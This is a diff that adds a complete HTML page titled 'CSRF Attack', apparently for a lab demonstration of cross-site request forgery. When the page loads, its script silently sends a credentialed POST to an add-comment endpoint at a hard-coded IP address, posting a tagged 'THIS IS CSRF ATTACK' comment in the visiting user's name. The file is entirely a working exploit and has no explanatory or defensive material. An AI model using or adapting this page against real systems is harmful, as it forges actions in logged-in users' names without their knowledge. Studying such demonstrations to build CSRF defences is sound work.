@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+
+<script>
+function randomString(length, chars) {
+    var result = '';
+    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
+    return result;
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    let now = new Date();
+    let dateString = now.toString();
+
+    
+    let comments = 'THIS IS CSRF ATTACK!!! --- BY ' +  randomString(8, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
+    comments += ' --- ' + dateString;
+
+    fetch('http://8.222.202.241:8000/add-comment', {
+        method: 'POST',
+        credentials: 'include',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: new URLSearchParams({
+            'post-id': 1,
+            'comment-textarea': comments
+        })
+    })
+    .then(response => console.log(response))
+    .catch(error => console.log(error));
+});
+</script>
+
+</body>
+</html>
